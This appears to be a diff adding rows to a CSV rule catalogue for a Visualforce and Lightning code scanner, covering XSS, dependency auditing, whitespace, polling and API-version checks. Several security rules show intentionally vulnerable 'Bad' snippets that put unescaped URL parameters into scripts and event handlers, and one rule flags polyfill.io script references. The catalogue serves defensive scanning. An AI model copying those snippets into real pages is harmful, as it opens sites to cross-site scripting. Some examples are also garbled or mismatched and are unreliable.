+vf:UnescapedAttributes,Unescaped Value Could Cause XSS,"Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response.<br/>
+<br/>
+Using unescaped parameters can be a security risk.
+<br/>
+c:* and apex:* attributes are not checked unless they are known to cause problems. You can check other attributes by adding them to the configuration for this rule.<br/>
+<br/>
+<h2>See</h2>
+<ul>
+  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_scontrols.htm"">Unescaped Output and Formulas in Visualforce Pages</a></li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
+  ('Eval Injection') </li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
+  ('Unsafe Reflection') </li>
+  <li> OWASP Top 10 2021 Category A03 - Injection </li>
+  
+</ul>
+      <BR><h2>Example:</h2><pre>
+
+&lt;apex:includeScript value=""{!$CurrentPage.parameters.userInput}"" /&gt; //Bad: not recommended.
+&lt;apex:outputText value=""{! data }"" escape=""false"" /&gt; //Bad: not recommended.
+
+&lt;div onclick = ""console.log('{!$CurrentPage.parameters.userInput}')""&gt;Click me!&lt;/div&gt; //Bad: not recommended.
+&lt;div onclick = ""console.log('{!JSENCODE($CurrentPage.parameters.userInput)}')""&gt;Click me!&lt;/div&gt; //Good: this is better.
+
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:UnencodedScript,Unencoded Formulas in Script Tags XSS,"Makes sure that all values obtained from URL parameters are properly escaped / sanitized to avoid XSS attacks.<br/>
+Input can be sanitized JSENCODE().<br/>
+<br/>
+Using unescaped parameters can be a security risk. 
+
+<h2>See</h2>
+<ul>
+  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_scontrols.htm"">Unescaped Output and Formulas in Visualforce Pages</a></li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
+  ('Eval Injection') </li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
+  ('Unsafe Reflection') </li>
+  <li> OWASP Top 10 2021 Category A03 - Injection </li>
+  
+</ul>
+
+
+      <BR><h2>Example:</h2><pre>
+
+&lt;script&gt;
+	var value = {!$CurrentPage.parameters.username}'; //Bad: not recommended.
+	var value = {!JSONENCODE($CurrentPage.parameters.username)}'; //Good: this is preferred.
+&lt;/script&gt;
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+cs-vf:npm-audit,Auditing npm dependencies for security vulnerabilities,"<p>There is a plethora of JavaScript libraries for use on the Web and in Node.JS apps.
+This greatly simplifies development, but you need to stay up-to-date on security fixes.</p>
+<p>According to <a href=""https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"">OWASP Top 10 Most Critical Web Application Security Risks</a>, using Components (ie. dependencies) with known vulnerabilities is ranked 9th, and there are many known stories of security breaches provided by (malicious or not) third-party dependencies.</p>
+<p>This rule inspects package-lock.json file inside your project and identifies if used npm dependencies have any known Common Vulnerabilities and Exposures (CVE).
+The rule relies on <a href=""https://github.com/advisories?query=ecosystem%3Anpm"">GitHub Advisory Database</a>.</p>",MAJOR,Visual Force & Lightning,SECURITY_HOTSPOT,FALSE
+cs-vf:unsecure-js-dependency,Auditing js dependencies for security vulnerabilities,"<p>There is a plethora of JavaScript libraries for use on the Web and in Node.JS apps.
+This greatly simplifies development, but you need to stay up-to-date on security fixes.</p>
+<p>According to <a href=""https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"">OWASP Top 10 Most Critical Web Application Security Risks</a>, using Components (ie. dependencies) with known vulnerabilities is ranked 9th, and there are many known stories of security breaches provided by (malicious or not) third-party dependencies.</p>
+<p>This rule identifies the open source JS components inside your project and evaluates if there are any known Common Vulnerabilities and Exposures (CVE) for their versions.</p>",MAJOR,Visual Force & Lightning,SECURITY_HOTSPOT,FALSE
+vf:AvoidTabCharacter,Avoid using Tab Characters Check,"Checks that there are no tab characters ('\t') in the source code.
+    
+
+      <p>The code snippet illustrates this rule:</p>
+
+      <pre>
+      &lt;head&gt;
+      &lt;meta http-equiv=""refresh"" content=""5""&gt;   //Bad: this is not recommended.
+      &lt;meta name=""description"" content=""...""&gt;
+      &lt;/head&gt;
+      </pre>",CRITICAL,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-irregular-whitespace,disallow irregular whitespace outside of strings and comments,"<p>Invalid or irregular whitespace causes issues with ECMAScript 5 parsers and also makes code harder to debug in a similar nature to mixed tabs and spaces.</p>
+<p>Various whitespace characters can be inputted by programmers by mistake for example from copying or keyboard shortcuts. Pressing Alt + Space on macOS adds in a non breaking space character for example.</p>
+<p>Known issues these spaces cause:</p>
+<ul>
+<li>Zero Width Space<ul>
+<li>Is NOT considered a separator for tokens and is often parsed as an <code>Unexpected token ILLEGAL</code></li>
+<li>Is NOT shown in modern browsers making code repository software expected to resolve the visualization</li></ul></li>
+<li>Line Separator<ul>
+<li>Is NOT a valid character within JSON which would cause parse errors</li></ul></li>
+</ul>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at catching invalid whitespace that is not a normal tab and space. Some of these characters may cause issues in modern browsers and others will be a debugging issue to spot.</p>
+<p>This rule disallows the following characters except where the options allow:</p>
+<pre><code>\u000B - Line Tabulation (\v) - &lt;VT&gt;
+\u000C - Form Feed (\f) - &lt;FF&gt;
+\u00A0 - No-Break Space - &lt;NBSP&gt;
+\u0085 - Next Line
+\u1680 - Ogham Space Mark
+\u180E - Mongolian Vowel Separator - &lt;MVS&gt;
+\ufeff - Zero Width No-Break Space - &lt;BOM&gt;
+\u2000 - En Quad
+\u2001 - Em Quad
+\u2002 - En Space - &lt;ENSP&gt;
+\u2003 - Em Space - &lt;EMSP&gt;
+\u2004 - Tree-Per-Em
+\u2005 - Four-Per-Em
+\u2006 - Six-Per-Em
+\u2007 - Figure Space
+\u2008 - Punctuation Space - &lt;PUNCSP&gt;
+\u2009 - Thin Space
+\u200A - Hair Space
+\u200B - Zero Width Space - &lt;ZWSP&gt;
+\u2028 - Line Separator
+\u2029 - Paragraph Separator
+\u202F - Narrow No-Break Space
+\u205f - Medium Mathematical Space
+\u3000 - Ideographic Space
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule has an object option for exceptions:</p>
+<ul>
+<li><code>""skipStrings"": true</code> (default) allows any whitespace characters in string literals</li>
+<li><code>""skipComments"": true</code> allows any whitespace characters in comments</li>
+<li><code>""skipRegExps"": true</code> allows any whitespace characters in regular expression literals</li>
+<li><code>""skipTemplates"": true</code> allows any whitespace characters in template literals</li>
+</ul>
+<h3 id=""skipstrings"">skipStrings</h3>
+<p>Examples of <strong>incorrect</strong> code for this rule with the default <code>{ ""skipStrings"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-irregular-whitespace: ""error""*/
+
+function thing()&amp;nbsp;/*&lt;NBSP&gt;*/{
+    return 'test';
+}
+
+function thing(&amp;nbsp;/*&lt;NBSP&gt;*/){
+    return 'test';
+}
+
+function thing&amp;nbsp;/*&lt;NBSP&gt;*/(){
+    return 'test';
+}
+
+function thingá Ž/*&lt;MVS&gt;*/(){
+    return 'test';
+}
+
+function thing() {
+    return 'test';â€‚/*&lt;ENSP&gt;*/
+}
+
+function thing() {
+    return 'test';&amp;nbsp;/*&lt;NBSP&gt;*/
+}
+
+function thing() {
+    // Description&amp;nbsp;&lt;NBSP&gt;: some descriptive text
+}
+
+/*
+Description&amp;nbsp;&lt;NBSP&gt;: some descriptive text
+*/
+
+function thing() {
+    return /&amp;nbsp;&lt;NBSP&gt;regexp/;
+}
+
+/*eslint-env es6*/
+function thing() {
+    return `templateâ€‚&lt;NBSP&gt;string`;
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule with the default <code>{ ""skipStrings"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-irregular-whitespace: ""error""*/
+
+function thing() {
+    return '&amp;nbsp;&lt;NBSP&gt;thing';
+}
+
+function thing() {
+    return 'â€‹&lt;ZWSP&gt;thing';
+}
+
+function thing() {
+    return 'th&amp;nbsp;&lt;NBSP&gt;ing';
+}
+</code></pre>
+<h3 id=""skipcomments"">skipComments</h3>
+<p>Examples of additional <strong>correct</strong> code for this rule with the <code>{ ""skipComments"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-irregular-whitespace: [""error"", { ""skipComments"": true }]*/
+
+function thing() {
+    // Description&amp;nbsp;&lt;NBSP&gt;: some descriptive text
+}
+
+/*
+Description&amp;nbsp;&lt;NBSP&gt;: some descriptive text
+*/
+</code></pre>
+<h3 id=""skipregexps"">skipRegExps</h3>
+<p>Examples of additional <strong>correct</strong> code for this rule with the <code>{ ""skipRegExps"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-irregular-whitespace: [""error"", { ""skipRegExps"": true }]*/
+
+function thing() {
+    return /&amp;nbsp;&lt;NBSP&gt;regexp/;
+}
+</code></pre>
+<h3 id=""skiptemplates"">skipTemplates</h3>
+<p>Examples of additional <strong>correct</strong> code for this rule with the <code>{ ""skipTemplates"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-irregular-whitespace: [""error"", { ""skipTemplates"": true }]*/
+/*eslint-env es6*/
+
+function thing() {
+    return `templateâ€‚&lt;NBSP&gt;string`;
+}
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you decide that you wish to use whitespace other than tabs and spaces outside of strings in your application.</p>
+<h2 id=""furtherreading"">Further Reading</h2>
+<ul>
+<li>[ECMA whitespace](https://es5.github.io/#x7.2 \xA0)</li>
+<li><a href=""http://timelessrepo.com/json-isnt-a-javascript-subset"">JSON whitespace issues</a></li>
+</ul>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidHighActionPollerInterval,Avoid High apex:actionpoller Interval,"Action methods used by &lt;apex:actionPoller&gt; should be lightweight. Itâ€™s a best practice to avoid performing DML, external service calls, and other resource-intensive operations in action methods called by an &lt;apex:actionPoller&gt;. Carefully consider the effect of your action method being called repeatedly by an &lt;apex:actionPoller&gt; at the interval you specify, especially if itâ€™s used on a page that will be widely distributed, or open continuously.
+
+See <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_best_practices_performance.htm"">Best Practices for Improving Visualforce Performance</a>
+  <BR><h2>Example:</h2><pre>
+
+&lt;apex:page controller=""ExampleController""&gt;
+    &lt;apex:form&gt;
+        &lt;apex:outputText value=""Watch this counter: {!count}"" id=""counter""/&gt;
+        &lt;apex:actionPoller action=""{!incrementCounter}"" reRender=""counter"" interval=""30""/&gt;  //Bad: An interval of 30 may be too high.
+    &lt;/apex:form&gt;
+&lt;/apex:page&gt;
+
+  </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:MetaRefreshCheck,Meta Tags Should Not Be Used to Refresh or Redirect,"<p>
+Use of <code>&lt;meta http-equiv=""refresh""&gt;</code> is discouraged by the World Wide Web Consortium (W3C).
+If a user clicks the 'Back' button, some browers will go back to the redirecting page, which will prevent the user from actually going back.
+</p>
+
+<p>
+To refresh the page, a better alternative is to use Ajax, to refresh only what needs to be refreshed and not the whole page.
+To redirect to another page, using the HTTP response status code 301 'Moved Permanently' and 302 'Found' is a better option.
+</p>
+
+  
+
+<p>The code snippet illustrates this rule:</p>
+
+<pre>
+&lt;head&gt;
+  &lt;meta http-equiv=""refresh"" content=""5""&gt;   //Bad: this is not recommended.
+  &lt;meta name=""description"" content=""...""&gt;
+&lt;/head&gt;
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:PasswordAutocompleteCheck,"""autocomplete"" Should Be Set to ""off"" on Input Elements of Type ""password""","<p>
+Most browsers automatically fill the content of input elements of type 'password' when this password has already been provided in the past.
+</p>
+
+<p>
+Imagine that user B takes control of a machine belonging to a user A.
+Accessing a secured web site as user A is trivial for user B if form input elements are automatically filled in by the browser on the site's login page.
+</p>
+
+To prevent browsers from storing credentials entered into HTML forms, include the attribute autocomplete=""off"" within the FORM tag
+
+  
+
+
+<pre>
+&lt;input type=""password"" /&gt;		//Bad: not recommended.
+</pre>
+
+
+<pre>
+&lt;input type=""password"" autocomplete=""off"" /&gt; 		//Good: autocomplete set to off is preferred.
+</pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:LightningAvoidUsingSession,Avoid using GETSESSIONID() and $API.Session_Id,"Lightning Experience does not have access to the API session token. Visualforce pages used within Lightning Experience, however, still have API access to the session ID.<br/>
+Test Visualforce pages that access the session ID within Lightning Experience.<br/>
+<br/>
+<h2>See</h2>
+<ul>
+  <li> <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">Considerations Before Transitioning to Lightning Experience</a></li>
+</ul>
+
+    <BR><h2>Example:</h2><pre>
+
+
+//The below will need to be checked in lightning experience.
+
+&lt;apex:page&gt;
+
+&lt;script&gt;
+  var __sfdcSessionId = '{!GETSESSIONID()}';
+  var sr = new SOAPRequest({orgNameSpace: ""BKSL2"", sessionId : __sfdcSessionId, endPointName: ""SETUP_Organization_WS""});
+&lt;/script&gt;
+
+&lt;/apex:page&gt;
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:OldPageApiVersion,API Version is Too Old,"This rule identifies classes which are using older versions of the API. Change the API Version of this class.
+  <BR><h2>Example:</h2><pre>
+&lt;?xml version=""1.0"" encoding=""UTF-8""?>
+&lt;ApexClass xmlns=""http://soap.sforce.com/2006/04/metadata"">
+    &lt;apiVersion>19.0&lt;/apiVersion>
+    &lt;status>Active&lt;/status>
+&lt;/ApexClass>
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:DoubleQuotesCheck,Use Double Quotes to Define Attributes,"Double quotes should be used to define attributes in VisualForce.  
+    <BR><h2>Example:</h2><pre>
+
+
+&lt;apex:page&gt;
+  &lt;html&gt;
+    &lt;div class='foo'&gt;   //Bad: not recommended.
+    
+      &lt;div class=""bar""&gt;  //Good: double quotes are preferred.
+      &lt;/div&gt;
+      
+      
+    &lt;/div&gt;
+  &lt;/html&gt;
+&lt;/apex:page&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:NoOnClickJavascript,Remove OnClick Javascript,"Javascript in ""onclick"", ""onmouseover"" and similar actions within Lightning components is ignored.  This could cause problems you are migrating to Lightning.  These actions should be used to invoke actions from the controller instead.
+		
+    <BR><h2>Example:</h2><pre>
+	
+
+&lt;aura:component&gt;
+
+  &lt;input type=""button"" value=""Flawed HTML Button"" onclick=""alert('bad')""/&gt;  //Bad: This will not work.
+
+  &lt;lightning:button label=""Framework Button"" onclick=""{!c.handleClick}""/&gt;    //Good: This uses the controller action handleClick.
+
+&lt;/aura:component&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:APIVersionsRetired,API Versions Retired,The retirement of older Salesforce Platform API versions (7.0 through 20.0) after the Summer '22 release is a critical step to ensure the continued smooth operation of Salesforce applications.,MAJOR,Visual Force & Lightning,BUG,FALSE
+vf:AccessibleLwc,Use Accessibility Attributes,Updating your LWC components with certain attributes can make your components more accessible to differently abled users.,MINOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidJavaScriptScriptlets,Avoid JavaScript Scriptlets in Aura Components and Apex Pages,"JavaScript scriptlets should not be directly embedded within the markup of Aura components or Apex pages. Instead, utilize Salesforce Static resources for including JavaScript code. Using direct <script> tags in components or pages can pose a security risk, increasing the likelihood of cross-site scripting (XSS) attacks.",CRITICAL,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:AvoidUsingPolyfill,Avoid Script References to Polyfill.io,"The use of cdn.polyfill.io poses a potential security risk primarily related to URL redirection and external resource loading. If attackers can manipulate references to this domain, they might redirect users to malicious sites or inject harmful scripts, leading to vulnerabilities.",CRITICAL,Visual Force & Lightning,VULNERABILITY,FALSE
